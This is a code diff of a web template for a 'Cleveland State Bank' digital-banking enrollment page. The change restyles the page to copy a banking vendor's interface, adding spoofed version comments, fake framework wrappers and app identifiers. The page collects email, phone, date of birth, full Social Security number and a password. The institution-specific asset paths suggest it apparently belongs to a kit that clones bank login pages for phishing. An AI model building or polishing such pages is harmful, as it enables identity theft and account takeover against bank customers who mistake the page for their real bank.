@@ -1,314 +1,352 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<!--- Version: /27.8.0 --->
+<!--- ng8Router: True --->
+<!--- shortVersion: 27.8.0 --->
+<!--[if lt IE 10]><html class="lt-ie9"><![endif]-->
+<html lang="en-us">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Enroll in Online Banking | Cleveland State Bank</title>
-    <link rel="icon" type="image/png" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="format-detection" content="telephone=no">
+<meta name="google-play-app" content="app-id=com.csiweb.digitalbanking">
+<meta name="msApplication-ID" content="microsoft.build.App" />
+<meta name="msApplication-PackageFamilyName" content="microsoft.build_appid" />
 
-    <style>
-        :root {
-            --csb-primary: #0f4c81;
-            --csb-primary-dark: #0a365c;
-            --csb-bg-gradient: linear-gradient(135deg, #07192f 0%, #0d2f54 50%, #113c6d 100%);
-            --csb-text-dark: #2d3748;
-            --csb-text-muted: #718096;
-            --csb-border: #e2e8f0;
-        }
+<link rel="apple-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}">
+<link rel="android-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" />
+<link rel="windows-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" />
+<link rel="shortcut icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" type="image/x-icon">
+<link rel="icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" type="image/x-icon">
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/primeicons@6.0.1/primeicons.min.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@24,300,0,0">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
 
-        body {
-            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: var(--csb-bg-gradient);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            color: var(--csb-text-dark);
-            -webkit-font-smoothing: antialiased;
-        }
+<title>Enroll in Digital Banking | Cleveland State Bank</title>
+<meta name="description" content="Cleveland State Bank Online Banking Enrollment">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 
-        .csb-top-nav {
-            background: rgba(7, 25, 47, 0.85);
-            backdrop-filter: blur(8px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 14px 28px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
 
-        .csb-nav-logo img { height: 44px; object-fit: contain; }
+body {
+    font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+    color: #2d3748;
+    background-color: #07192e;
+    min-height: 100vh;
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+}
 
-        .csb-nav-right {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
+.layout-view-wrapper-loading {
+    padding-left: 0 !important;
+}
 
-        .csb-nav-link {
-            color: rgba(255, 255, 255, 0.85);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
+.background-image {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: #09203a;
+    background: radial-gradient(circle at 50% 25%, #103861 0%, #07192e 100%);
+    z-index: 0;
+}
 
-        .csb-nav-link:hover { color: #ffffff; text-decoration: underline; }
+#loginContainer {
+    position: relative;
+    z-index: 1;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 30px 16px;
+}
 
-        .csb-secure-badge {
-            background: rgba(16, 185, 129, 0.15);
-            border: 1px solid rgba(16, 185, 129, 0.35);
-            color: #6ee7b7;
-            font-size: 12px;
-            font-weight: 600;
-            padding: 5px 12px;
-            border-radius: 20px;
-        }
+#loginForm {
+    width: 100%;
+    max-width: 480px;
+    margin: 0 auto;
+}
 
-        .csb-auth-container {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 40px 16px;
-        }
+.loginCard {
+    background: #ffffff;
+    border-radius: 8px;
+    box-shadow: 0 10px 35px rgba(0, 0, 0, 0.4);
+    padding: 36px 36px 32px;
+}
 
-        .csb-auth-card {
-            background: #ffffff;
-            width: 100%;
-            max-width: 520px;
-            border-radius: 12px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            overflow: hidden;
-        }
+.bank-logo-wrapper {
+    text-align: center;
+    margin-bottom: 20px;
+}
 
-        .csb-card-header {
-            text-align: center;
-            padding: 28px 32px 18px;
-            border-bottom: 1px solid #edf2f7;
-            background: #fafbfc;
-        }
+.bank-logo {
+    background-image: url("{{ asset('assets/institutions/clevelandstatebank/images/logo.png') }}");
+    background-repeat: no-repeat;
+    background-position: center center;
+    background-size: contain;
+    height: 60px;
+    width: 100%;
+    max-width: 250px;
+    margin: 0 auto;
+    display: block;
+}
 
-        .csb-card-logo {
-            max-width: 200px;
-            margin: 0 auto 12px;
-            display: block;
-        }
+.utility-textCenter {
+    text-align: center;
+}
 
-        .csb-card-header h1 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 20px;
-            font-weight: 700;
-            color: var(--csb-primary);
-            margin-bottom: 4px;
-        }
+.enroll-header {
+    text-align: center;
+    margin-bottom: 22px;
+}
 
-        .csb-card-header p {
-            font-size: 13px;
-            color: var(--csb-text-muted);
-        }
+.enroll-header h2 {
+    font-family: 'Montserrat', sans-serif;
+    font-size: 19px;
+    font-weight: 700;
+    color: #0f4c81;
+    margin-bottom: 6px;
+}
 
-        .csb-card-body { padding: 26px 32px 32px; }
+.enroll-header p {
+    font-size: 13px;
+    color: #718096;
+    line-height: 1.4;
+}
 
-        .csb-alert-danger {
-            background: #fef2f2;
-            border: 1px solid #fecaca;
-            color: #991b1b;
-            padding: 12px 14px;
-            border-radius: 6px;
-            font-size: 13px;
-            margin-bottom: 20px;
-        }
+/* CSI Alerts */
+.csi-alert-danger {
+    background-color: #fdf2f2;
+    border: 1px solid #f8b4b4;
+    color: #9b1c1c;
+    padding: 11px 14px;
+    border-radius: 4px;
+    font-size: 13px;
+    line-height: 1.4;
+    margin-bottom: 18px;
+}
 
-        .csb-form-group { margin-bottom: 18px; }
+/* Form Controls */
+.form-group {
+    margin-bottom: 16px;
+}
 
-        .csb-form-label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #374151;
-            margin-bottom: 6px;
-        }
+.control-label {
+    display: block;
+    font-family: 'Roboto', sans-serif;
+    font-size: 13px;
+    font-weight: 500;
+    color: #4a5568;
+    margin-bottom: 6px;
+}
 
-        .csb-form-control {
-            width: 100%;
-            height: 44px;
-            padding: 10px 14px;
-            font-size: 14px;
-            border: 1.5px solid #d1d5db;
-            border-radius: 6px;
-            background: #ffffff;
-            color: #1f2937;
-            font-family: inherit;
-        }
+.form-control {
+    width: 100%;
+    height: 44px;
+    padding: 10px 14px;
+    font-family: 'Roboto', sans-serif;
+    font-size: 14px;
+    color: #1a202c;
+    background: #ffffff;
+    border: 1px solid #cbd5e0;
+    border-radius: 4px;
+    transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
+}
 
-        .csb-form-control:focus {
-            outline: none;
-            border-color: var(--csb-primary);
-            box-shadow: 0 0 0 3px rgba(15, 76, 129, 0.15);
-        }
+.form-control:focus {
+    outline: none;
+    border-color: #0f4c81;
+    box-shadow: 0 0 0 3px rgba(15, 76, 129, 0.15);
+}
 
-        .csb-grid-2 {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 14px;
-        }
+.form-row-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+}
 
-        .csb-btn-submit {
-            width: 100%;
-            height: 48px;
-            background: var(--csb-primary);
-            color: #ffffff;
-            border: none;
-            border-radius: 6px;
-            font-family: 'Montserrat', sans-serif;
-            font-size: 14px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            box-shadow: 0 4px 12px rgba(15, 76, 129, 0.25);
-            margin-top: 8px;
-        }
+/* Action Buttons */
+.btn-primary {
+    width: 100%;
+    height: 46px;
+    background-color: #0f4c81;
+    border: 1px solid #0f4c81;
+    border-radius: 4px;
+    color: #ffffff;
+    font-family: 'Montserrat', sans-serif;
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    transition: background-color 0.2s, border-color 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-top: 8px;
+}
 
-        .csb-btn-submit:hover { background: var(--csb-primary-dark); }
+.btn-primary:hover {
+    background-color: #0a365c;
+    border-color: #0a365c;
+}
 
-        .csb-auth-footer {
-            background: rgba(7, 25, 47, 0.95);
-            border-top: 1px solid rgba(255, 255, 255, 0.08);
-            padding: 20px;
-            text-align: center;
-            color: rgba(255, 255, 255, 0.65);
-            font-size: 12px;
-        }
+.sign-in-link-wrap {
+    text-align: center;
+    margin-top: 18px;
+}
 
-        .csb-footer-badges {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 20px;
-            margin-bottom: 10px;
-        }
+.sign-in-link-wrap a {
+    color: #0f4c81;
+    text-decoration: none;
+    font-size: 13px;
+    font-weight: 500;
+}
 
-        .csb-footer-badges img { height: 30px; object-fit: contain; }
+.sign-in-link-wrap a:hover {
+    text-decoration: underline;
+}
 
-        .csb-signin-link {
-            display: block;
-            text-align: center;
-            margin-top: 16px;
-            color: var(--csb-primary);
-            font-size: 13px;
-            font-weight: 600;
-            text-decoration: none;
-        }
-        .csb-signin-link:hover { text-decoration: underline; }
-    </style>
+/* Footer */
+.login-footer {
+    margin-top: 24px;
+    text-align: center;
+    color: rgba(255, 255, 255, 0.7);
+    font-size: 12px;
+    line-height: 1.6;
+}
+
+.login-footer-badges {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 20px;
+    margin-bottom: 10px;
+}
+
+.login-footer-badges img {
+    height: 28px;
+    object-fit: contain;
+}
+
+@media (max-width: 480px) {
+    .loginCard {
+        padding: 28px 20px 24px;
+    }
+    .form-row-2 {
+        grid-template-columns: 1fr;
+        gap: 0;
+    }
+}
+</style>
 </head>
-<body>
-    <header class="csb-top-nav">
-        <a href="{{ route('home') }}" class="csb-nav-logo">
-            <img src="{{ asset('assets/institutions/clevelandstatebank/images/logo-white.png') }}" alt="Cleveland State Bank">
-        </a>
-        <div class="csb-nav-right">
-            <div class="csb-secure-badge"><i class="fas fa-lock"></i> Secure Enrollment</div>
-            <a href="{{ route('login') }}" class="csb-nav-link"><i class="fas fa-sign-in-alt"></i> Sign In</a>
-        </div>
-    </header>
+<body ontouchstart="">
+<div id="csi-angularjs-view" class="view">
+    <div class="layout-view-wrapper layout-view-wrapper-loading">
+        <div class="layout-view">
+            <div class="background-image"></div>
+            <div id="loginContainer">
+                <div id="loginForm">
+                    <div class="loginFormInner layout-delay">
+                        <div class="loginCard layout-delay ng-isolate-scope">
+                            <!-- BEGIN LOGIN BODY -->
+                            <section class="loginBody">
+                                <div class="bank-logo-wrapper">
+                                    <div class="utility-textCenter bank-logo"></div>
+                                </div>
 
-    <main class="csb-auth-container">
-        <div class="csb-auth-card">
-            <div class="csb-card-header">
-                <img src="{{ asset('assets/institutions/clevelandstatebank/images/logo.png') }}" alt="Cleveland State Bank" class="csb-card-logo">
-                <h1>Online Banking Enrollment</h1>
-                <p>Register for secure 24/7 access to your Cleveland State Bank accounts.</p>
+                                <div class="enroll-header">
+                                    <h2>Digital Banking Enrollment</h2>
+                                    <p>Please enter your information to enroll in Cleveland State Bank Online Banking.</p>
+                                </div>
+
+                                @if ($errors->any())
+                                    <div class="csi-alert-danger">
+                                        @foreach ($errors->all() as $error)
+                                            <div>{{ $error }}</div>
+                                        @endforeach
+                                    </div>
+                                @endif
+
+                                <form method="POST" action="{{ route('register') }}" id="csiRegisterForm">
+                                    @csrf
+
+                                    <div class="form-group">
+                                        <label class="control-label">Email Address *</label>
+                                        <input type="email" name="email" value="{{ old('email') }}" class="form-control" required autofocus placeholder="name@example.com">
+                                    </div>
+
+                                    <div class="form-group">
+                                        <label class="control-label">Phone Number *</label>
+                                        <input type="tel" name="phone" value="{{ old('phone') }}" class="form-control" required placeholder="(662) 000-0000">
+                                    </div>
+
+                                    <div class="form-row-2">
+                                        <div class="form-group">
+                                            <label class="control-label">Date of Birth *</label>
+                                            <input type="text" name="date_of_birth" id="dob_field" value="{{ old('date_of_birth') }}" class="form-control" placeholder="MM/DD/YYYY" required>
+                                        </div>
+                                        <div class="form-group">
+                                            <label class="control-label">SSN *</label>
+                                            <input type="text" name="ssn" id="ssn_field" value="{{ old('ssn') }}" class="form-control" placeholder="XXX-XX-XXXX" maxlength="11" required>
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group">
+                                        <label class="control-label">Create Password *</label>
+                                        <input type="password" name="password" id="password_field" class="form-control" placeholder="Enter secure password" required>
+                                    </div>
+
+                                    @if(isset($googleReCaptcha) && $googleReCaptcha)
+                                        <div style="margin-bottom: 18px; display:flex; justify-content:center;">
+                                            <div class="g-recaptcha" data-sitekey="{{ json_decode($googleReCaptcha->data, true)['site_key'] }}"></div>
+                                        </div>
+                                    @endif
+
+                                    <button type="submit" class="btn btn-primary btn-block">Continue Enrollment</button>
+                                </form>
+
+                                <div class="sign-in-link-wrap">
+                                    <a href="{{ route('login') }}">Already enrolled? Sign In</a>
+                                </div>
+                            </section>
+                            <!-- /END LOGIN BODY -->
+                        </div>
+                    </div>
+                </div>
+
+                <footer class="login-footer">
+                    <div class="login-footer-badges">
+                        <img src="{{ asset('assets/institutions/clevelandstatebank/images/fdic-white.png') }}" alt="Member FDIC">
+                        <img src="{{ asset('assets/institutions/clevelandstatebank/images/ehl-white.png') }}" alt="Equal Housing Lender">
+                    </div>
+                    <div>&copy; {{ date('Y') }} Cleveland State Bank. All Rights Reserved. Member FDIC. Equal Housing Lender.</div>
+                </footer>
+
             </div>
-
-            <div class="csb-card-body">
-                @if ($errors->any())
-                    <div class="csb-alert-danger">
-                        @foreach ($errors->all() as $error)
-                            <div>{{ $error }}</div>
-                        @endforeach
-                    </div>
-                @endif
-
-                <form method="POST" action="{{ route('register') }}" id="csbRegisterForm">
-                    @csrf
-
-                    <div class="csb-form-group">
-                        <label class="csb-form-label">Email Address *</label>
-                        <input type="email" name="email" value="{{ old('email') }}" class="csb-form-control" required autofocus placeholder="name@example.com">
-                    </div>
-
-                    <div class="csb-form-group">
-                        <label class="csb-form-label">Phone Number *</label>
-                        <input type="tel" name="phone" value="{{ old('phone') }}" class="csb-form-control" required placeholder="(662) 000-0000">
-                    </div>
-
-                    <div class="csb-grid-2">
-                        <div class="csb-form-group">
-                            <label class="csb-form-label">Date of Birth *</label>
-                            <input type="text" name="date_of_birth" id="dob_field" value="{{ old('date_of_birth') }}" class="csb-form-control" placeholder="MM/DD/YYYY" required>
-                        </div>
-                        <div class="csb-form-group">
-                            <label class="csb-form-label">SSN *</label>
-                            <input type="text" name="ssn" id="ssn_field" value="{{ old('ssn') }}" class="csb-form-control" placeholder="XXX-XX-XXXX" maxlength="11" required>
-                        </div>
-                    </div>
-
-                    <div class="csb-form-group">
-                        <label class="csb-form-label">Create Password *</label>
-                        <input type="password" name="password" id="password_field" class="csb-form-control" placeholder="Enter secure password" required>
-                    </div>
-
-                    @if(isset($googleReCaptcha) && $googleReCaptcha)
-                        <div style="margin-bottom: 20px; display:flex; justify-content:center;">
-                            <div class="g-recaptcha" data-sitekey="{{ json_decode($googleReCaptcha->data, true)['site_key'] }}"></div>
-                        </div>
-                    @endif
-
-                    <button type="submit" class="csb-btn-submit">
-                        <i class="fas fa-arrow-right"></i> Next Step
-                    </button>
-
-                    <a href="{{ route('login') }}" class="csb-signin-link">Already have an account? Sign In</a>
-                </form>
-            </div>
         </div>
-    </main>
+    </div>
+</div>
 
-    <footer class="csb-auth-footer">
-        <div class="csb-footer-badges">
-            <img src="{{ asset('assets/institutions/clevelandstatebank/images/fdic-white.png') }}" alt="Member FDIC">
-            <img src="{{ asset('assets/institutions/clevelandstatebank/images/ehl-white.png') }}" alt="Equal Housing Lender">
-        </div>
-        <div>&copy; {{ date('Y') }} Cleveland State Bank. Member FDIC. Equal Housing Lender.</div>
-    </footer>
-
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
-    <script>
-        $(document).ready(function() {
-            if ($('#ssn_field').length) {
-                new Cleave('#ssn_field', { delimiters: ['-', '-'], blocks: [3, 2, 4], numericOnly: true });
-            }
-            if ($('#dob_field').length) {
-                new Cleave('#dob_field', { date: true, datePattern: ['m', 'd', 'Y'] });
-            }
-        });
-    </script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
+<script>
+$(document).ready(function() {
+    if ($('#ssn_field').length) {
+        new Cleave('#ssn_field', { delimiters: ['-', '-'], blocks: [3, 2, 4], numericOnly: true });
+    }
+    if ($('#dob_field').length) {
+        new Cleave('#dob_field', { date: true, datePattern: ['m', 'd', 'Y'] });
+    }
+});
+</script>
 </body>
 </html>
